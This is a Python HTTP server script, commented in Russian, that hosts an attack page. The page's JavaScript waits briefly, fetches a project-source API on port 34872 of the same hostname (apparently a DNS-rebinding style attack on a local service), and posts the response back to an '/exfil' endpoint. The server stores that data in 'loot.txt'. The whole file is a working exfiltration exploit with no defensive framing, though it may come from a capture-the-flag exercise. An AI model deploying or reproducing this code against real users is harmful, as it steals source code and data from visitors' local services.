import os
from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse

PORT = int(os.environ.get("PORT", 8080))


class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Генерируем пейлоад на лету
        # Render выдает динамический домен, подставляем его в JS
        host = self.headers.get('Host')

        payload = f"""
        <html>
        <head><title>Loading...</title></head>
        <body>
        <script>
        setTimeout(() => {{
            // Твой домен Render без порта
            const target = "http://{host}:34872/api/project/source";
            console.log("Hitting", target);
            fetch(target)
                .then(r => r.text())
                .then(data => {{
                    fetch("/exfil?data=" + encodeURIComponent(data));
                }})
                .catch(e => console.error(e));
        }}, 2500);
        </script>
        <p>Wait for it...</p>
        </body>
        </html>
        """

        if self.path.startswith("/exfil"):
            query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            data = query.get("data", [""])[0]
            with open("loot.txt", "a") as f:
                f.write(data + "\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(payload.encode())


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", PORT), Handler)
    print(f"Starting server on port {PORT}")
    server.serve_forever()